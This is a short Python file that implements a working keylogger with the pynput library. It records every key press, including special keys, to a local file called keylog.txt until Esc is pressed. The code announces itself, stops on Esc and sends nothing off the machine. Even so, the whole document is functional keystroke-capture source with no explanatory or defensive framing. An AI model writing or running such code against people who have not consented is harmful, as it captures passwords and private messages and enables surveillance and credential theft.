from pynput import keyboard

class SimpleKeylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.listener = None

    def on_press(self, key):
        """Callback function for key press events."""
        try:
            with open(self.log_file, "a") as file:
                file.write(f"{key.char}")
        except AttributeError:
            with open(self.log_file, "a") as file:
                file.write(f" {str(key)} ")

    def on_release(self, key):
        """Callback function for key release events."""
        if key == keyboard.Key.esc:  # Stop the listener when Esc is pressed
            print("Esc key pressed. Stopping keylogger...")
            return False

    def start(self):
        """Start the keylogger."""
        print(f"Keylogger is running... Press 'Esc' to stop.")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            self.listener = listener
            listener.join()

# Create and run the keylogger
if __name__ == "__main__":
    keylogger = SimpleKeylogger()
    keylogger.start()
